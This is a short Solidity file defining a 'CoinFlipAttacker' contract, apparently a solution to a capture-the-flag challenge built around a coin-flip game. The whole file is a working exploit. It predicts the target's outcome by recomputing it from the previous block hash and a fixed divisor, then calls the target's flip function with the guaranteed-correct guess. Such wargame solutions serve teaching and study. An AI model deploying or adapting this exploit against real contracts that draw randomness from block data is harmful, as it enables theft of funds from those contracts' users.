pragma solidity ^0.8.0;

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
  address public challengeInstance;
  uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
  constructor(address _challengeInstance) {
    challengeInstance = _challengeInstance;
  }

  function attack() public {
    CoinFlip coinFlip = CoinFlip(challengeInstance);
    coinFlip.flip(getAnswer());
  }

  function getAnswer() public view returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return side;
  }
}